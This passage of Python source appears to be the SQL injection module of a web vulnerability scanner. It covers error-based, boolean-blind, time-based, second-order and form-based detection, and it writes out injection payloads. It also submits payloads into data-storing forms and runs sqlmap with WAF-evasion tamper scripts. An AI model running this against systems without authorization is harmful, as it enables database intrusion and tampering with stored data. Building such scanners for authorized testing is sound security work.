                    confidence = base_confidence
                
                # Check if error is in typical error format
                if re.search(r'(error|exception|warning).*?(sql|database|query)', 
                           response.text, re.IGNORECASE):
                    confidence = min(1.0, confidence + 0.1)
                
                # Extract error message
                error_lines = []
                for line in response.text.splitlines():
                    if re.search(pattern, line, re.IGNORECASE):
                        error_lines.append(line.strip())
                
                result = {
                    'vulnerable': confidence > 0.7,
                    'confidence': confidence,
                    'database_type': db_type if db_type != 'Generic' else None,
                    'error_message': ' '.join(error_lines[:2]) if error_lines else match.group(0),
                    'evidence': {
                        'pattern_matched': pattern,
                        'error_snippet': match.group(0)[:200]
                    }
                }
                break
        
        return result
    
    async def _enhanced_boolean_detection(self, client: httpx.AsyncClient, url: str,
                                          param_name: str, params: Dict, original_value: str,
                                          baseline_data: Dict, config: Optional[ScanConfig] = None) -> Dict[str, Any]:
        """Enhanced boolean-based blind SQL injection detection."""
        result = {
            'vulnerable': False,
            'confidence': 0.0,
            'evidence': {}
        }
        
        parsed = urlparse(url)
        
        # Test true condition
        true_payload = original_value + "' AND '1'='1"
        test_params = params.copy()
        test_params[param_name] = [true_payload]
        true_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
        
        try:
            true_response = await self._rate_limited_request(client, true_url, config, timeout=15)
            true_data = self._extract_response_features(true_response)
            
            # Test false condition
            false_payload = original_value + "' AND '1'='2"
            test_params[param_name] = [false_payload]
            false_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
            
            false_response = await self._rate_limited_request(client, false_url, config, timeout=15)
            false_data = self._extract_response_features(false_response)
            
            # Calculate differences
            length_diff = abs(true_data['length'] - false_data['length'])
            status_diff = true_data['status_code'] != false_data['status_code']
            hash_diff = true_data['hash'] != false_data['hash']
            title_diff = true_data['title'] != false_data['title']
            
            # Compare with baseline
            baseline_diff = abs(baseline_data['length'] - true_data['length'])
            
            # Calculate confidence
            confidence = 0.0
            if length_diff > 100 and length_diff > baseline_diff * 2:
                confidence += 0.4
            if status_diff:
                confidence += 0.2
            if hash_diff and length_diff > 50:
                confidence += 0.2
            if title_diff:
                confidence += 0.2
            
            result = {
                'vulnerable': confidence > 0.6,
                'confidence': min(confidence, 0.9),
                'evidence': {
                    'true_length': true_data['length'],
                    'false_length': false_data['length'],
                    'length_difference': length_diff,
                    'status_difference': status_diff,
                    'hash_difference': hash_diff,
                }
            }
        except (httpx.HTTPError, asyncio.TimeoutError) as e:
            self.logger.debug(f"Boolean detection failed: {e}")
        
        return result
    
    async def _verify_sql_injection(self, client: httpx.AsyncClient, test_url: str, 
                                    param_name: str, params: Dict) -> bool:
        """Verify SQL injection to reduce false positives."""
        try:
            # Send the same payload again with rate limiting
            response1 = await self._rate_limited_request(client, test_url, None, timeout=10)
            response2 = await self._rate_limited_request(client, test_url, None, timeout=10)
            
            # Check consistency
            if abs(len(response1.text) - len(response2.text)) > 1000:
                return False  # Inconsistent, likely false positive
            
            # Check if both have SQL errors
            has_error_1 = any(re.search(p, response1.text, re.IGNORECASE) 
                            for p, _, _ in self.sql_error_patterns[:10])
            has_error_2 = any(re.search(p, response2.text, re.IGNORECASE) 
                            for p, _, _ in self.sql_error_patterns[:10])
            
            return has_error_1 and has_error_2
        except Exception as e:
            self.logger.debug(f"Verification failed: {e}")
            return False
    
    def _create_vulnerability(self, param_name: str, url: str, payload_info: Dict,
                            detection_result: Dict, injection_type: str) -> Vulnerability:
        """Create a vulnerability object with detailed evidence."""
        confidence = detection_result.get('confidence', 0.8)
        evidence = {
            'parameter': param_name,
            'payload': payload_info['payload'],
            'payload_type': payload_info['type'],
            'payload_description': payload_info['description'],
            'injection_type': injection_type,
            **detection_result.get('evidence', {})
        }
        
        if detection_result.get('database_type'):
            evidence['database_type'] = detection_result['database_type']
        
        if detection_result.get('error_message'):
            evidence['error_message'] = detection_result['error_message']
        
        # Determine severity
        if confidence > 0.9:
            severity = SeverityLevel.CRITICAL
        elif confidence > 0.75:
            severity = SeverityLevel.HIGH
        else:
            severity = SeverityLevel.MEDIUM
        
        return Vulnerability(
            module=self.name,
            name=f"SQL Injection ({injection_type}) in parameter '{param_name}'",
            description=self._generate_detailed_description(injection_type, param_name, evidence),
            severity=severity,
            confidence=confidence,
            affected_urls=[url],
            evidence=evidence,
            remediation=self._generate_remediation(injection_type),
            references=[
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html",
                "https://portswigger.net/web-security/sql-injection"
            ],
            cwe_ids=["CWE-89"]
        )
    
    def _generate_detailed_description(self, injection_type: str, param_name: str, 
                                      evidence: Dict) -> str:
        """Generate detailed vulnerability description."""
        desc = f"SQL Injection vulnerability detected in parameter '{param_name}' using {injection_type} technique. "
        
        if evidence.get('database_type'):
            desc += f"Database identified as {evidence['database_type']}. "
        
        if evidence.get('error_message'):
            desc += f"Error message disclosed: '{evidence['error_message'][:100]}...' "
        
        if injection_type == 'Boolean-Based Blind':
            desc += f"Application shows different responses for true/false conditions (length difference: {evidence.get('length_difference', 'N/A')} bytes). "
        
        if injection_type == 'Time-Based Blind':
            desc += f"Application response time indicates SQL injection (delay: {evidence.get('delay_observed', 'N/A')}s). "
        
        desc += "This vulnerability allows attackers to extract sensitive data, modify database contents, or gain unauthorized access."
        
        return desc
    
    def _generate_remediation(self, injection_type: str) -> str:
        """Generate specific remediation advice."""
        base = "1. Use parameterized queries (prepared statements) exclusively. "
        base += "2. Never concatenate user input directly into SQL queries. "
        base += "3. Implement input validation with whitelisting. "
        base += "4. Apply principle of least privilege to database accounts. "
        base += "5. Use Web Application Firewall (WAF) as defense-in-depth. "
        
        if 'Error' in injection_type:
            base += "6. Disable detailed error messages in production. "
            base += "7. Implement proper error handling and logging. "
        
        if 'Blind' in injection_type:
            base += "6. Ensure consistent error responses. "
            base += "7. Implement rate limiting and monitoring. "
        
        return base
    
    async def _advanced_time_based_detection(self, url: str, config: ScanConfig,
                                            db_type: Optional[str]) -> Dict[str, Any]:
        """Advanced time-based detection with statistical analysis."""
        vulnerabilities = []
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            return {'vulnerabilities': []}
        
        async with httpx.AsyncClient(verify=False) as client:
            for param_name, param_values in params.items():
                original_value = param_values[0] if param_values else '1'
                
                # Measure baseline response times (5 requests)
                baseline_times = []
                for _ in range(self.BASELINE_REQUESTS):
                    try:
                        start = time.time()
                        await self._rate_limited_request(client, url, config, timeout=20)
                        baseline_times.append(time.time() - start)
                    except (httpx.HTTPError, asyncio.TimeoutError) as e:
                        self.logger.debug(f"Baseline timing request failed: {e}")
                
                if len(baseline_times) < 3:
                    continue
                
                # Calculate baseline statistics
                baseline_mean = statistics.mean(baseline_times)
                baseline_stdev = statistics.stdev(baseline_times) if len(baseline_times) > 1 else 0.5
                
                # Generate time-based payloads
                time_payloads = self.payload_generator.generate_payloads('generic', db_type)
                time_payloads = [p for p in time_payloads if p['type'] == 'time-based']
                
                for payload_info in time_payloads[:3]:  # Test top 3
                    test_params = params.copy()
                    test_params[param_name] = [original_value + payload_info['payload']]
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                    
                    # Measure response times with payload (3 requests)
                    payload_times = []
                    for _ in range(self.TIME_BASED_REQUESTS):
                        try:
                            start = time.time()
                            await self._rate_limited_request(client, test_url, config, timeout=20)
                            elapsed = time.time() - start
                            payload_times.append(elapsed)
                        except asyncio.TimeoutError:
                            payload_times.append(20)  # Timeout value
                        except (httpx.HTTPError, Exception) as e:
                            self.logger.debug(f"Time-based request failed: {e}")
                    
                    if len(payload_times) < 2:
                        continue
                    
                    payload_mean = statistics.mean(payload_times)
                    expected_delay = payload_info.get('delay', 5)
                    
                    # Statistical analysis
                    time_increase = payload_mean - baseline_mean
                    z_score = (payload_mean - baseline_mean) / (baseline_stdev + 0.1)
                    
                    # Check if time increase is significant
                    if time_increase >= expected_delay * self.MIN_TIME_DELAY and z_score > self.STATISTICAL_Z_THRESHOLD:
                        confidence = min(0.95, 0.6 + (time_increase / expected_delay) * 0.2)
                        
                        # Verify with second payload
                        verified = False
                        if len(time_payloads) > 1:
                            verify_payload = time_payloads[1]
                            test_params[param_name] = [original_value + verify_payload['payload']]
                            verify_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params, doseq=True)}"
                            
                            try:
                                start = time.time()
                                await self._rate_limited_request(client, verify_url, config, timeout=20)
                                verify_time = time.time() - start
                                if verify_time >= expected_delay * self.MIN_TIME_DELAY:
                                    verified = True
                                    confidence = min(0.95, confidence + 0.1)
                            except (httpx.HTTPError, asyncio.TimeoutError) as e:
                                self.logger.debug(f"Verification request failed: {e}")
                        
                        vuln = Vulnerability(
                            module=self.name,
                            name=f"Time-Based Blind SQL Injection in '{param_name}'",
                            description=self._generate_detailed_description('Time-Based Blind', param_name, {
                                'baseline_mean': baseline_mean,
                                'payload_mean': payload_mean,
                                'time_increase': time_increase,
                                'z_score': z_score,
                            }),
                            severity=SeverityLevel.HIGH,
                            confidence=confidence,
                            affected_urls=[url],
                            evidence={
                                'parameter': param_name,
                                'payload': payload_info['payload'],
                                'injection_type': 'Time-Based Blind',
                                'baseline_mean': round(baseline_mean, 2),
                                'payload_mean': round(payload_mean, 2),
                                'time_increase': round(time_increase, 2),
                                'expected_delay': expected_delay,
                                'z_score': round(z_score, 2),
                                'verified': verified,
                                'statistical_significance': 'High' if z_score > 3 else 'Medium',
                            },
                            remediation=self._generate_remediation('Time-Based Blind'),
                            cwe_ids=["CWE-89"]
                        )
                        vulnerabilities.append(vuln)
                        break
        
        return {'vulnerabilities': vulnerabilities}
    
    async def _second_order_detection(self, url: str, config: ScanConfig) -> Dict[str, Any]:
        """Detect second-order SQL injection vulnerabilities."""
        vulnerabilities = []
        candidates = []
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=15) as client:
                response = await self._rate_limited_request(client, url, config)
                
                # Find forms that might store data (using class-level compiled pattern)
                forms = self.FORM_PATTERN.findall(response.text)
                
                storage_forms = []
                for form_html in forms:
                    # Look for forms with POST method and fields suggesting data storage
                    if 'method' in form_html.lower() and ('post' in form_html.lower() or 'method' not in form_html.lower()):
                        if any(keyword in form_html.lower() for keyword in ['name', 'email', 'username', 'comment', 'message']):
                            storage_forms.append(form_html)
                
                # Test each storage form
                for form_html in storage_forms[:2]:  # Test up to 2 forms
                    action_match = re.search(r'action=["\']([^"\']*)["\']', form_html)
                    action = action_match.group(1) if action_match else url
                    
                    if not action.startswith(('http://', 'https://')):
                        action = urljoin(url, action)
                    
                    # Use class-level compiled pattern
                    inputs = self.INPUT_PATTERN.findall(form_html)
                    
                    # Phase 1: Store payload
                    unique_marker = f"sqli_test_{int(time.time())}"
                    second_order_payload = f"{unique_marker}' OR '1'='1"
                    
                    form_data = {}
                    for input_name in inputs:
                        if 'name' in input_name.lower() or 'username' in input_name.lower():
                            form_data[input_name] = second_order_payload
                        else:
                            form_data[input_name] = f"test_{unique_marker}"
                    
                    try:
                        # Submit the form
                        await client.post(action, data=form_data)
                        
                        # Phase 2: Crawl other pages to find where data is displayed
                        links = re.findall(r'href=["\']([^"\']+)["\']', response.text)
                        
                        for link in links[:5]:  # Check up to 5 links
                            if not link.startswith(('http://', 'https://')):
                                link = urljoin(url, link)
                            
                            if urlparse(link).netloc != urlparse(url).netloc:
                                continue
                            
                            try:
                                check_response = await self._rate_limited_request(client, link, config, timeout=10)
                                
                                # Check if our unique marker appears
                                if unique_marker in check_response.text:
                                    candidates.append({
                                        'storage_url': action,
                                        'display_url': link,
                                        'field': list(form_data.keys())[0]
                                    })
                                    
                                    # Check for SQL errors indicating second-order injection
                                    for pattern, confidence, db_type in self.sql_error_patterns[:10]:
                                        if re.search(pattern, check_response.text, re.IGNORECASE):
                                            vuln = Vulnerability(
                                                module=self.name,
                                                name=f"Second-Order SQL Injection",
                                                description=f"Second-order SQL injection detected. Data stored at {action} is executed unsafely when displayed at {link}.",
                                                severity=SeverityLevel.HIGH,
                                                confidence=0.75,
                                                affected_urls=[action, link],
                                                evidence={
                                                    'storage_endpoint': action,
                                                    'display_endpoint': link,
                                                    'injection_type': 'Second-Order',
                                                    'field': list(form_data.keys())[0],
                                                    'payload': second_order_payload,
                                                    'database_type': db_type if db_type != 'Generic' else None,
                                                },
                                                remediation="Use parameterized queries for ALL database operations, including when retrieving and displaying stored data. Validate and sanitize data both on input AND output.",
                                                cwe_ids=["CWE-89", "CWE-74"]
                                            )
                                            vulnerabilities.append(vuln)
                                            break
                            except (httpx.HTTPError, asyncio.TimeoutError) as e:
                                self.logger.debug(f"Second-order check failed for {link}: {e}")
                    except (httpx.HTTPError, Exception) as e:
                        self.logger.debug(f"Second-order form submission failed: {e}")
        except Exception as e:
            self.logger.debug(f"Second-order detection error: {e}")
        
        return {'vulnerabilities': vulnerabilities, 'candidates': candidates}
    
    async def _context_aware_form_testing(self, url: str, config: ScanConfig,
                                         db_type: Optional[str]) -> List[Vulnerability]:
        """Test forms with context-aware payloads."""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=15) as client:
                response = await self._rate_limited_request(client, url, config)
                
                # Use class-level compiled pattern
                forms = self.FORM_PATTERN.findall(response.text)
                
                for form_html in forms[:3]:
                    action_match = re.search(r'action=["\']([^"\']*)["\']', form_html)
                    action = action_match.group(1) if action_match else url
                    
                    if not action.startswith(('http://', 'https://')):
                        action = urljoin(url, action)
                    
                    method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
                    method = method_match.group(1).upper() if method_match else 'POST'
                    
                    # Use class-level compiled pattern
                    inputs = self.INPUT_PATTERN.findall(form_html)
                    
                    # Detect form context
                    if any(word in form_html.lower() for word in ['login', 'signin', 'auth']):
                        context = 'auth'
                    elif any(word in form_html.lower() for word in ['search', 'query']):
                        context = 'search'
                    else:
                        context = 'generic'
                    
                    # Generate context-specific payloads
                    payloads = self.payload_generator.generate_payloads(context, db_type)
                    
                    for input_name in inputs:
                        for payload_info in payloads[:8]:
                            form_data = {inp: 'test' for inp in inputs}
                            form_data[input_name] = payload_info['payload']
                            
                            try:
                                if method == 'POST':
                                    test_response = await client.post(action, data=form_data, timeout=15)
                                else:
                                    test_response = await client.get(action, params=form_data, timeout=15)
                                
                                # Check for SQL errors
                                error_result = self._enhanced_error_detection(
                                    test_response, response, payload_info
                                )
                                
                                if error_result['vulnerable']:
                                    vuln = Vulnerability(
                                        module=self.name,
                                        name=f"SQL Injection in Form Field '{input_name}'",
                                        description=self._generate_detailed_description(
                                            'Error-Based', input_name, error_result.get('evidence', {})
                                        ),
                                        severity=SeverityLevel.CRITICAL if error_result['confidence'] > 0.9 else SeverityLevel.HIGH,
                                        confidence=error_result['confidence'],
                                        affected_urls=[action],
                                        evidence={
                                            'form_action': action,
                                            'field': input_name,
                                            'method': method,
                                            'payload': payload_info['payload'],
                                            'injection_type': 'Form-Based',
                                            'context': context,
                                            **error_result.get('evidence', {})
                                        },
                                        remediation=self._generate_remediation('Error-Based'),
                                        cwe_ids=["CWE-89"]
                                    )
                                    vulnerabilities.append(vuln)
                                    break
                            except (httpx.HTTPError, asyncio.TimeoutError) as e:
                                self.logger.debug(f"Form testing failed for {input_name}: {e}")
        except Exception as e:
            self.logger.debug(f"Context-aware form testing error: {e}")
        
        return vulnerabilities
    
    async def _intelligent_sqlmap_integration(self, url: str, config: ScanConfig,
                                             recon_data: Dict) -> Optional[Dict[str, Any]]:
        """Intelligent SQLMap integration using reconnaissance data."""
        try:
            db_type = recon_data.get('database_type')
            
            # Build intelligent SQLMap command
            options = ['--batch', '--random-agent', '--timeout=15', '--retries=2']
            
            # Add database-specific options
            if db_type:
                db_map = {
                    'MySQL': 'MySQL',
                    'PostgreSQL': 'PostgreSQL',
                    'MSSQL': 'Microsoft SQL Server',
                    'Oracle': 'Oracle',
                    'SQLite': 'SQLite',
                }
                if db_type in db_map:
                    options.append(f'--dbms={db_map[db_type]}')
            
            # Adjust level and risk based on scan type
            if config.scan_type == ScanType.AGGRESSIVE:
                options.extend(['--level=5', '--risk=3', '--threads=8'])
            else:
                options.extend(['--level=3', '--risk=2', '--threads=4'])
            
            # Add tamper scripts for WAF evasion
            options.append('--tamper=space2comment,between')
            
            with tempfile.TemporaryDirectory() as temp_dir:
                output_dir = os.path.join(temp_dir, 'sqlmap_output')
                cmd = ['sqlmap', '-u', url] + options + [f'--output-dir={output_dir}']
                
                # Run SQLMap with proper cleanup
                process = None
                try:
                    process = subprocess.Popen(
                        cmd,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    stdout, stderr = process.communicate(timeout=config.timeout)
                    result_text = stdout
                except subprocess.TimeoutExpired:
                    if process:
                        process.terminate()
                        try:
                            process.wait(timeout=5)
                        except subprocess.TimeoutExpired:
                            process.kill()
                    self.logger.warning("SQLMap timed out")
                    return None
                
                vulnerabilities = []
                vulnerable_params = []
                database_type = None
                
                if result_text and 'vulnerable' in result_text.lower():
                    param_pattern = re.compile(r"Parameter: ([^\s]+)")
                    params = param_pattern.findall(result_text)
                    vulnerable_params.extend(params)
                    
                    db_pattern = re.compile(r"back-end DBMS: ([^\n]+)")
                    db_match = db_pattern.search(result_text)
                    if db_match:
                        database_type = db_match.group(1).strip()
                    
                    for param in params:
                        vulnerabilities.append(
                            Vulnerability(
                                module=self.name,
                                name=f"SQL Injection (SQLMap Confirmed) in '{param}'",
                                description=f"SQLMap, an industry-standard SQL injection tool, confirmed a SQL injection vulnerability in parameter '{param}'. This is a high-confidence finding.",
                                severity=SeverityLevel.CRITICAL,
                                confidence=1.0,
                                affected_urls=[url],
                                evidence={
                                    'parameter': param,
                                    'database_type': database_type,
                                    'tool': 'SQLMap',
                                    'injection_type': 'Confirmed by Automated Tool',
                                },
                                remediation=self._generate_remediation('Confirmed'),
                                references=[
                                    "https://owasp.org/www-community/attacks/SQL_Injection",
                                    "https://sqlmap.org/"
                                ],
                                cwe_ids=["CWE-89"]
                            )
                        )
                
                return {
                    'vulnerabilities': vulnerabilities,
                    'vulnerable_params': vulnerable_params,
                    'database_type': database_type
                }
        except Exception as e:
            self.logger.error(f"SQLMap integration failed: {e}")
        
        return None
    
    def _is_sqlmap_available(self) -> bool:
        """Check if SQLMap is available."""
        try:
            result = subprocess.run(['sqlmap', '--version'], capture_output=True, timeout=5)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError, Exception) as e:
            self.logger.debug(f"SQLMap not available: {e}")
            return False
    
    async def _passive_sql_check(self, url: str) -> List[Vulnerability]:
        """Passive SQL error detection."""
        vulnerabilities = []
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=10) as client:
                response = await client.get(url)
                
                for pattern, confidence, db_type in self.sql_error_patterns:
                    match = re.search(pattern, response.text, re.IGNORECASE)
                    if match:
                        vulnerabilities.append(
                            Vulnerability(
                                module=self.name,
                                name="SQL Error Disclosure",
                                description=f"Application exposes SQL error messages in normal responses, potentially revealing database structure and type ({db_type}).",
                                severity=SeverityLevel.MEDIUM,
                                confidence=0.7,
                                affected_urls=[url],
                                evidence={
                                    'error_pattern': pattern,
                                    'database_type': db_type if db_type != 'Generic' else None,
                                    'error_snippet': match.group(0)[:200],
                                },
                                remediation="Implement proper error handling. Never expose detailed database errors to users. Use generic error messages in production.",
                                cwe_ids=["CWE-209", "CWE-200"]
                            )
                        )
                        break
        except (httpx.HTTPError, asyncio.TimeoutError) as e:
            self.logger.debug(f"Passive SQL check failed: {e}")
        
        return vulnerabilities
    
    def _deduplicate_vulnerabilities(self, vulnerabilities: List[Vulnerability]) -> List[Vulnerability]:
        """Remove duplicate vulnerabilities."""
        seen = set()
        unique_vulns = []
        
        for vuln in vulnerabilities:
            # Create unique key based on parameter and type
            param = vuln.evidence.get('parameter', '')
            inj_type = vuln.evidence.get('injection_type', vuln.name)
            key = f"{param}_{inj_type}"
            
            if key not in seen:
                seen.add(key)
                unique_vulns.append(vuln)
            else:
                # Keep the one with higher confidence
                for i, existing in enumerate(unique_vulns):
                    existing_param = existing.evidence.get('parameter', '')
                    existing_type = existing.evidence.get('injection_type', existing.name)
                    if f"{existing_param}_{existing_type}" == key:
                        if vuln.confidence > existing.confidence:
                            unique_vulns[i] = vuln
                        break
        
        
        return unique_vulns
    
    async def _rate_limited_request(self, client: httpx.AsyncClient, url: str, 
                                   config: Optional[ScanConfig], timeout: int = 15) -> httpx.Response:
        """Make rate-limited request."""
        # Apply rate limiting if config is provided
        if config and hasattr(config, 'rate_limit'):
            rate_limit = config.rate_limit
            if self._last_request_time > 0:
                elapsed = time.time() - self._last_request_time
                min_interval = 1.0 / rate_limit
                if elapsed < min_interval:
                    await asyncio.sleep(min_interval - elapsed)
        
        self._last_request_time = time.time()
        
        # Use config timeout if available, otherwise use provided timeout
        actual_timeout = min(config.timeout if config else timeout, timeout)
        return await client.get(url, timeout=actual_timeout)
    
    def _collect_evidence(self, response: httpx.Response, payload: str, 
                         additional_data: Dict[str, Any] = None) -> Dict[str, Any]:
        """Collect comprehensive evidence for vulnerability reporting."""
        evidence = {
            'request_url': str(response.url),
            'request_method': response.request.method,
            'status_code': response.status_code,
            'response_length': len(response.text),
            'response_time': response.elapsed.total_seconds() if hasattr(response, 'elapsed') else None,
            'headers': dict(response.headers),
            'payload_used': payload,
            'timestamp': datetime.utcnow().isoformat(),
            'response_snippet': response.text[:500] if response.text else None,
        }
        
        if additional_data:
            evidence.update(additional_data)
        
        return evidence
